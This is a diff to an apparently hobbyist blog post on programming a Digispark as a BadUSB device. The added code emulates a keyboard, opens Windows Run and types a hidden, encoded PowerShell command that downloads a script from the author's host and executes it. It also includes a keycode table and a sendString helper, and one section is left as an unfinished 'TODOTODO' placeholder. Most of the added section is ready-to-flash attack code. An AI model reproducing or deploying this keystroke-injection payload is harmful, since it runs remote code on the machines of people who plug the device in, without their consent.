@@ -74,13 +74,13 @@ void loop() {
 }
 </code></pre>
 <p class="entryContent">
-  <strong>- Deploying a payload:</strong>
+  <strong>- Creating a payload:</strong>
   <br>
   Now that we have a working and programmable Digispark we need to device a way to load payloads into 
   it. But before we do that, we need to talk about about the memory limitations of this device...
   <br>
   The Digispark has 6012 bytes of memory, that is definitly not a lot to work with. The amount of data 
-  that can fit in 6Kb is about this much<a href="#2">[^2]</a>:  
+  that can fit in 6Kb is about this much <a href="#2">[^2]</a>:  
 </p>
 <div class="entryImgs center">
   <div class="entryImg imgSmall">
@@ -92,3 +92,172 @@ void loop() {
     <small>[^2] 7.3KB - very compressed Nora </small>
   </div>
 </div>
+<p class="entryContent">
+  Due to this limitation I have opted to instead of having the scripts in the Digispark, to host them
+  online and just have a script that gets the script from a given url. This comes with the added benefit
+  of allowing you to edit the script without needing to reprogram the Digispark.
+  In my case im hosting the scripts at <mark>tiny.cait.moe</mark>.
+  <br>
+  For example in <a href="https://tiny.cait.moe/?file=ps" target="_blank">tiny.cait.moe/?file=ps</a> I 
+  host a powershell script that will be executed when inserting the Digispark into a computer.
+  <br>
+  <strong>- Deploying a payload:</strong>
+  <br>
+  To make the Digispark run the script we want we are going to make it emulate a keyboard and type in the
+  necessary command. Just a heads up, keyboard layouts are really annoying. The DigiKeyboard library can
+  alleviate this a bit, but it comes with its own quirks and weird behaviors.
+
+  The DigiKeyboard library allows us to easily emulate a keyboard, this would be a simple implementation
+  of an Actual Hello World program:
+</p>
+<pre><code class="cpp">
+#include "DigiKeyboard.h"
+const int inputDelay = 250;
+  
+void setup() { pinMode(1, OUTPUT); }
+  
+void loop() {
+  // Start keyboard
+  DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(inputDelay); 
+  // Type out hello world
+  DigiKeyboard.print("Hello World!");
+  DigiKeyboard.delay(inputDelay);
+  // Indicate the program has finished with the red led
+  for(;;) { digitalWrite(1, HIGH); }
+}
+</code></pre>
+<p class="entryContent">
+  As I said before keyboard layouts are annoying, but why? depending on the keyboard layout sending the 
+  same keycode can result in different characters being typed out, this is mainly an issue with special
+  character positions (I am not taking into acount non-latin layouts). Using this 
+  <a href="https://www.ibm.com/docs/en/ssw_aix_73/navigation/kybdtech.pdf" target="_blank">Keyboard Reference</a>
+  in conjunction with this 
+  <a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf" target="_blank">Usb HID Usage Tables (page 53)</a>
+  we can figure out some ways to circumvent this issue.
+  <br>
+  After a *great* afternoon reading through posts and the usb manual i have composed this list of useful
+  keycodes:
+  <ul>
+    <mark>Key - Usage ID (Dec)</mark>
+    <br>
+    - <u>Main keys</u>
+    <li>"/" => 84</li>
+    <li>"*" => 85</li>
+    <li>"-" => 86</li>
+    <li>"+" => 87</li>
+    <li>"=" => 103</li>
+    <li>"(" => 182</li>
+    <li>")" => 183</li>
+    <li>"{" => 184</li>
+    <li>"}" => 185</li>
+    <li>"^" => 195</li>
+    <li>"%" => 196</li>
+    <li>"<" => 197</li>
+    <li>">" => 198</li>
+    <li>"&" => 199</li>
+    <li>"|" => 201</li>
+    <li>":" => 203</li>
+    <li>"#" => 204</li>
+    <li>"@" => 206</li>
+    <li>"!" => 207</li>
+    - <u>Other useful keys</u>
+    <li>"Tab" => 186</li>
+    <li>"Backspace" => 187</li>
+  </ul>
+  <br>
+  Implementing this into a function would look something like this:
+</p>
+<pre><code class="cpp">
+void sendString(char rString[]) {
+  // Loop though each char
+  for(int i = 0; i < x; i++) {
+    // https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 53
+    if     (rString[i] == '/') { DigiKeyboard.sendKeyStroke(84);  }
+    else if(rString[i] == '*') { DigiKeyboard.sendKeyStroke(85);  }
+    else if(rString[i] == '-') { DigiKeyboard.sendKeyStroke(86);  }
+    else if(rString[i] == '+') { DigiKeyboard.sendKeyStroke(87);  }
+    else if(rString[i] == '=') { DigiKeyboard.sendKeyStroke(103); }
+    else if(rString[i] == '(') { DigiKeyboard.sendKeyStroke(182); }
+    else if(rString[i] == ')') { DigiKeyboard.sendKeyStroke(183); }
+    else if(rString[i] == '{') { DigiKeyboard.sendKeyStroke(184); }
+    else if(rString[i] == '}') { DigiKeyboard.sendKeyStroke(185); }
+    else if(rString[i] == '^') { DigiKeyboard.sendKeyStroke(195); }
+    else if(rString[i] == '%') { DigiKeyboard.sendKeyStroke(196); }
+    else if(rString[i] == '<') { DigiKeyboard.sendKeyStroke(197); }
+    else if(rString[i] == '>') { DigiKeyboard.sendKeyStroke(198); }
+    else if(rString[i] == '&') { DigiKeyboard.sendKeyStroke(199); }
+    else if(rString[i] == '|') { DigiKeyboard.sendKeyStroke(201); }
+    else if(rString[i] == ':') { DigiKeyboard.sendKeyStroke(203); }
+    else if(rString[i] == '#') { DigiKeyboard.sendKeyStroke(204); }
+    else if(rString[i] == '@') { DigiKeyboard.sendKeyStroke(206); }
+    else if(rString[i] == '!') { DigiKeyboard.sendKeyStroke(207); }
+    else { DigiKeyboard.print(rString[i]); }
+  }
+}
+</code></pre>
+<p class="entryContent">
+  This function takes in a string of length x and loops though it replacing the known characters with 
+  the appropriate keycodes. If the character doesn't match any it tries to send it through the library.
+  <br>
+  Now lets talk about the command we will execute TODOTODO
+
+
+
+
+
+
+  We can then adapt the code we had (I've also added the functionality to open windows run):
+</p>
+<pre><code class="cpp">
+#include "DigiKeyboard.h"
+
+// https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 53
+const int KEY_TAB = 186;
+const int KEY_BACKSPACE = 187;
+
+const int inputDelay = 250;
+
+void setup() { pinMode(1, OUTPUT); }
+
+void loop() {
+  // "irm -Uri https://tiny.cait.moe/?file=ps | iex"
+  char command[162] = "powershell -nol -nop -noni -w h -ep b -e aQByAG0AIAAtAFUAcgBpACAAaAB0AHQAcABzADoALwAvAHQAaQBuAHkALgBjAGEAaQB0AC4AbQBvAGUALwA/AGYAaQBsAGUAPQBwAHMAIAB8ACAAaQBlAHgA";
+  // Start keyboard
+  DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(inputDelay); 
+  // Open Windows run (win + r)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); DigiKeyboard.delay(inputDelay); 
+  // Type the command
+  sendString(command); delay(inputDelay);
+  // Execute the command
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  // Indicate the program has finished with the red led
+  for(;;) { digitalWrite(1, HIGH); }
+}
+
+void sendString(char rString[]) {
+  // Loop though each char
+  for(int i = 0; i < 161; i++) {
+    // https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf page 53
+    if     (rString[i] == '/') { DigiKeyboard.sendKeyStroke(84);  }
+    else if(rString[i] == '*') { DigiKeyboard.sendKeyStroke(85);  }
+    else if(rString[i] == '-') { DigiKeyboard.sendKeyStroke(86);  }
+    else if(rString[i] == '+') { DigiKeyboard.sendKeyStroke(87);  }
+    else if(rString[i] == '=') { DigiKeyboard.sendKeyStroke(103); }
+    else if(rString[i] == '(') { DigiKeyboard.sendKeyStroke(182); }
+    else if(rString[i] == ')') { DigiKeyboard.sendKeyStroke(183); }
+    else if(rString[i] == '{') { DigiKeyboard.sendKeyStroke(184); }
+    else if(rString[i] == '}') { DigiKeyboard.sendKeyStroke(185); }
+    else if(rString[i] == '^') { DigiKeyboard.sendKeyStroke(195); }
+    else if(rString[i] == '%') { DigiKeyboard.sendKeyStroke(196); }
+    else if(rString[i] == '<') { DigiKeyboard.sendKeyStroke(197); }
+    else if(rString[i] == '>') { DigiKeyboard.sendKeyStroke(198); }
+    else if(rString[i] == '&') { DigiKeyboard.sendKeyStroke(199); }
+    else if(rString[i] == '|') { DigiKeyboard.sendKeyStroke(201); }
+    else if(rString[i] == ':') { DigiKeyboard.sendKeyStroke(203); }
+    else if(rString[i] == '#') { DigiKeyboard.sendKeyStroke(204); }
+    else if(rString[i] == '@') { DigiKeyboard.sendKeyStroke(206); }
+    else if(rString[i] == '!') { DigiKeyboard.sendKeyStroke(207); }
+    else { DigiKeyboard.print(rString[i]); }
+  }
+}
+</code></pre>
